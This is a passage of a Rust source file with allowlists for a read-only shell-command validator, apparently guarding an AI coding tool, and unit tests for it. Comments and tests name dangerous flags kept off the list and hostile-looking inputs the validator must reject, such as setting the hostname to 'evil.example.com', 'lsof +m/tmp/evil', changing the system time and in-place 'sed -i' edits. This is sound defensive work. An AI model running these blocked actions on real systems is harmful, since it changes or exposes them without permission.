            ("-V", F::None),
            ("--version", F::None),
            ("-n", F::None),
            ("--numeric", F::None),
            ("-r", F::None),
            ("--resolve", F::None),
            ("-a", F::None),
            ("--all", F::None),
            ("-l", F::None),
            ("--listening", F::None),
            ("-o", F::None),
            ("--options", F::None),
            ("-e", F::None),
            ("--extended", F::None),
            ("-m", F::None),
            ("--memory", F::None),
            ("-p", F::None),
            ("--processes", F::None),
            ("-i", F::None),
            ("--info", F::None),
            ("-s", F::None),
            ("--summary", F::None),
            ("-4", F::None),
            ("--ipv4", F::None),
            ("-6", F::None),
            ("--ipv6", F::None),
            ("-0", F::None),
            ("--packet", F::None),
            ("-t", F::None),
            ("--tcp", F::None),
            ("-M", F::None),
            ("--mptcp", F::None),
            ("-S", F::None),
            ("--sctp", F::None),
            ("-u", F::None),
            ("--udp", F::None),
            ("-d", F::None),
            ("--dccp", F::None),
            ("-w", F::None),
            ("--raw", F::None),
            ("-x", F::None),
            ("--unix", F::None),
            ("--tipc", F::None),
            ("--vsock", F::None),
            ("-f", F::String),
            ("--family", F::String),
            ("-A", F::String),
            ("--query", F::String),
            ("--socket", F::String),
            ("-Z", F::None),
            ("--context", F::None),
            ("-z", F::None),
            ("--contexts", F::None),
            // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
            // to switch network namespace. While isolated to forked process, too invasive.
            ("-b", F::None),
            ("--bpf", F::None),
            ("-E", F::None),
            ("--events", F::None),
            ("-H", F::None),
            ("--no-header", F::None),
            ("-O", F::None),
            ("--oneline", F::None),
            ("--tipcinfo", F::None),
            ("--tos", F::None),
            ("--cgroup", F::None),
            ("--inet-sockopt", F::None),
            // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
            // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
            // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
        ])),
    ));

    // fd/fdfind — fast file finder (fd-find). Read-only search tool.
    // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
    // (execute command with all results) are deliberately excluded.
    list.push(("fd", simple(FD_SAFE_FLAGS.clone())));
    // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
    list.push(("fdfind", simple(FD_SAFE_FLAGS.clone())));

    extend_with_external(&mut list, &PYRIGHT_READ_ONLY_COMMANDS);
    extend_with_external(&mut list, &DOCKER_READ_ONLY_COMMANDS);

    list
});

/// gh commands are ant-only since they make network requests, which goes against
/// the read-only validation principle of no network access.
pub static ANT_ONLY_COMMAND_ALLOWLIST: LazyLock<Vec<(&'static str, CommandConfig)>> =
    LazyLock::new(|| {
        let mut list: Vec<(&'static str, CommandConfig)> = Vec::new();

        // All gh read-only commands from shared validation map
        extend_with_external(&mut list, &GH_READ_ONLY_COMMANDS);

        // aki — Anthropic internal knowledge-base search CLI.
        // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
        list.push((
            "aki",
            simple(flags(&[
                ("-h", F::None),
                ("--help", F::None),
                ("-k", F::None),
                ("--keyword", F::None),
                ("-s", F::None),
                ("--semantic", F::None),
                ("--no-adaptive", F::None),
                ("-n", F::Number),
                ("--limit", F::Number),
                ("-o", F::Number),
                ("--offset", F::Number),
                ("--source", F::String),
                ("--exclude-source", F::String),
                ("-a", F::String),
                ("--after", F::String),
                ("-b", F::String),
                ("--before", F::String),
                ("--collection", F::String),
                ("--drive", F::String),
                ("--folder", F::String),
                ("--descendants", F::None),
                ("-m", F::String),
                ("--meta", F::String),
                ("-t", F::String),
                ("--threshold", F::String),
                ("--kw-weight", F::String),
                ("--sem-weight", F::String),
                ("-j", F::None),
                ("--json", F::None),
                ("-c", F::None),
                ("--chunk", F::None),
                ("--preview", F::None),
                ("-d", F::None),
                ("--full-doc", F::None),
                ("-v", F::None),
                ("--verbose", F::None),
                ("--stats", F::None),
                ("-S", F::Number),
                ("--summarize", F::Number),
                ("--explain", F::None),
                ("--examine", F::String),
                ("--url", F::String),
                ("--multi-turn", F::Number),
                ("--multi-turn-model", F::String),
                ("--multi-turn-context", F::String),
                ("--no-rerank", F::None),
                ("--audit", F::None),
                ("--local", F::None),
                ("--staging", F::None),
            ])),
        ));

        list
    });

#[cfg(test)]
mod tests {
    use super::*;

    fn lookup<'a>(
        list: &'a [(&'static str, CommandConfig)],
        name: &str,
    ) -> Option<&'a CommandConfig> {
        list.iter().find(|(k, _)| *k == name).map(|(_, v)| v)
    }

    fn position(list: &[(&'static str, CommandConfig)], name: &str) -> usize {
        list.iter()
            .position(|(k, _)| *k == name)
            .unwrap_or_else(|| panic!("missing allowlist entry: {name}"))
    }

    fn args(tokens: &[&str]) -> Vec<String> {
        tokens.iter().map(|t| t.to_string()).collect()
    }

    #[test]
    fn xargs_flag_types_are_pinned() {
        let cfg = lookup(&COMMAND_ALLOWLIST, "xargs").unwrap();
        assert_eq!(cfg.safe_flags.get("-I"), Some(&F::Braces));
        assert_eq!(cfg.safe_flags.get("-E"), Some(&F::Eof));
        assert_eq!(cfg.safe_flags.get("-d"), Some(&F::Char));
        assert_eq!(cfg.safe_flags.get("-n"), Some(&F::Number));
        // lowercase -i / -e are deliberately absent (optional-attached-arg differential)
        assert!(!cfg.safe_flags.contains_key("-i"));
        assert!(!cfg.safe_flags.contains_key("-e"));
        assert_eq!(cfg.safe_flags.len(), 11);
    }

    #[test]
    fn fd_and_fdfind_share_flags_and_exclude_exec() {
        let fd = lookup(&COMMAND_ALLOWLIST, "fd").unwrap();
        let fdfind = lookup(&COMMAND_ALLOWLIST, "fdfind").unwrap();
        assert_eq!(fd.safe_flags, fdfind.safe_flags);
        assert_eq!(fd.safe_flags.get("--max-depth"), Some(&F::Number));
        assert_eq!(fd.safe_flags.get("--type"), Some(&F::String));
        for excluded in ["-x", "--exec", "-X", "--exec-batch", "-l", "--list-details"] {
            assert!(
                !fd.safe_flags.contains_key(excluded),
                "{excluded} must not be safe"
            );
        }
    }

    #[test]
    fn base64_does_not_respect_double_dash() {
        let cfg = lookup(&COMMAND_ALLOWLIST, "base64").unwrap();
        assert_eq!(cfg.respects_double_dash, Some(false));
        // Everything else leaves the default (respects POSIX --)
        assert_eq!(
            lookup(&COMMAND_ALLOWLIST, "grep")
                .unwrap()
                .respects_double_dash,
            None
        );
    }

    #[test]
    fn hostname_regex_blocks_positional_args() {
        let cfg = lookup(&COMMAND_ALLOWLIST, "hostname").unwrap();
        let re = cfg.regex.as_ref().unwrap();
        assert!(re.is_match("hostname").unwrap());
        assert!(re.is_match("hostname -f").unwrap());
        assert!(re.is_match("hostname --fqdn -v").unwrap());
        assert!(!re.is_match("hostname evil.example.com").unwrap());
        assert!(!re.is_match("hostname -F /etc/hostname").unwrap());
    }

    #[test]
    fn ps_callback_blocks_bsd_style_e() {
        let cb = lookup(&COMMAND_ALLOWLIST, "ps")
            .unwrap()
            .additional_command_is_dangerous_callback
            .unwrap();
        assert!(cb("ps auxe", &args(&["auxe"])));
        assert!(cb("ps e", &args(&["e"])));
        assert!(!cb("ps aux", &args(&["aux"])));
        assert!(!cb("ps -e", &args(&["-e"])));
    }

    #[test]
    fn date_callback_only_allows_plus_format_positionals() {
        let cb = lookup(&COMMAND_ALLOWLIST, "date")
            .unwrap()
            .additional_command_is_dangerous_callback
            .unwrap();
        assert!(!cb("", &args(&["+%Y-%m-%d"])));
        assert!(!cb("", &args(&["-d", "tomorrow", "+%s"])));
        assert!(!cb("", &args(&["--date=tomorrow"])));
        assert!(!cb("", &args(&["-u"])));
        // MMDDhhmm positional sets the system time
        assert!(cb("", &args(&["12312359"])));
        assert!(cb("", &args(&["-u", "12312359"])));
    }

    #[test]
    fn lsof_callback_blocks_plus_m() {
        let cb = lookup(&COMMAND_ALLOWLIST, "lsof")
            .unwrap()
            .additional_command_is_dangerous_callback
            .unwrap();
        assert!(cb("", &args(&["+m"])));
        assert!(cb("", &args(&["+m/tmp/evil"])));
        assert!(!cb("", &args(&["-i"])));
        assert!(!cb("", &args(&[])));
    }

    #[test]
    fn tput_callback_blocks_dangerous_capabilities_and_dash_s() {
        let cfg = lookup(&COMMAND_ALLOWLIST, "tput").unwrap();
        // -S is deliberately absent from the safe flags
        assert!(!cfg.safe_flags.contains_key("-S"));
        assert_eq!(cfg.safe_flags.len(), 3);
        let cb = cfg.additional_command_is_dangerous_callback.unwrap();
        assert!(cb("", &args(&["clear"])));
        assert!(cb("", &args(&["reset"])));
        assert!(cb("", &args(&["--", "clear"])));
        assert!(cb("", &args(&["-S"])));
        assert!(cb("", &args(&["-xS"])));
        assert!(!cb("", &args(&["cols"])));
        assert!(!cb("", &args(&["-T", "xterm", "cols"])));
    }

    #[test]
    fn sed_callback_delegates_to_sed_allowlist() {
        let cb = lookup(&COMMAND_ALLOWLIST, "sed")
            .unwrap()
            .additional_command_is_dangerous_callback
            .unwrap();
        // Read-only line print — allowed
        assert!(!cb(
            "sed -n '1p' file.txt",
            &args(&["-n", "1p", "file.txt"])
        ));
        // In-place edit — dangerous
        assert!(cb(
            "sed -i 's/a/b/' file.txt",
            &args(&["-i", "s/a/b/", "file.txt"])
        ));
    }

    #[test]
    fn checksum_commands_share_identical_flag_sets() {
        let sha256 = lookup(&COMMAND_ALLOWLIST, "sha256sum").unwrap();
        let sha1 = lookup(&COMMAND_ALLOWLIST, "sha1sum").unwrap();
        let md5 = lookup(&COMMAND_ALLOWLIST, "md5sum").unwrap();
        assert_eq!(sha256.safe_flags, sha1.safe_flags);
        assert_eq!(sha256.safe_flags, md5.safe_flags);
        assert_eq!(sha256.safe_flags.get("--check"), Some(&F::None));
        assert_eq!(sha256.safe_flags.len(), 17);
    }

    #[test]
    fn tree_excludes_output_and_recursive_html_flags() {
        let cfg = lookup(&COMMAND_ALLOWLIST, "tree").unwrap();
        assert!(!cfg.safe_flags.contains_key("-o"));
        assert!(!cfg.safe_flags.contains_key("-R"));
        assert_eq!(cfg.safe_flags.get("-L"), Some(&F::Number));
        assert_eq!(cfg.safe_flags.get("-H"), Some(&F::String));
    }

    #[test]
    fn dangerous_flags_are_blocked_by_omission() {
        let date = lookup(&COMMAND_ALLOWLIST, "date").unwrap();
        for f in ["-s", "--set", "-f", "--file"] {
            assert!(!date.safe_flags.contains_key(f), "date {f} must be blocked");
        }
        let info = lookup(&COMMAND_ALLOWLIST, "info").unwrap();
        for f in ["-o", "--output", "--dribble", "--init-file", "--restore"] {
            assert!(!info.safe_flags.contains_key(f), "info {f} must be blocked");
        }
        let ss = lookup(&COMMAND_ALLOWLIST, "ss").unwrap();
        for f in [
            "-K", "--kill", "-D", "--diag", "-F", "--filter", "-N", "--net",
        ] {
            assert!(!ss.safe_flags.contains_key(f), "ss {f} must be blocked");
        }
        let lsof = lookup(&COMMAND_ALLOWLIST, "lsof").unwrap();
        assert!(!lsof.safe_flags.contains_key("-D"));
    }

    #[test]
    fn external_tables_are_spliced_in_order() {
        let list = &*COMMAND_ALLOWLIST;
        assert_eq!(list[0].0, "xargs");
        // git entries sit between xargs and file
        assert!(position(list, "xargs") < position(list, "git diff"));
        assert!(position(list, "git diff") < position(list, "file"));
        // First-match scanning relies on longer prefixes being inserted first
        assert!(position(list, "git remote show") < position(list, "git remote"));
        assert!(position(list, "grep") < position(list, "rg"));
        assert!(position(list, "fdfind") < position(list, "pyright"));
        assert_eq!(list.last().unwrap().0, "docker inspect");
        // gh entries live only in the ant-only table
        assert!(lookup(list, "gh pr view").is_none());
    }

    #[test]
    fn ant_only_allowlist_contains_gh_and_aki() {
        let list = &*ANT_ONLY_COMMAND_ALLOWLIST;
        assert!(lookup(list, "gh pr view").is_some());
        assert_eq!(list.last().unwrap().0, "aki");
        let aki = lookup(list, "aki").unwrap();
        assert_eq!(aki.safe_flags.get("--limit"), Some(&F::Number));
        assert_eq!(aki.safe_flags.get("--summarize"), Some(&F::Number));
        // --audit-csv omitted: writes to disk
        assert!(!aki.safe_flags.contains_key("--audit-csv"));
    }
}
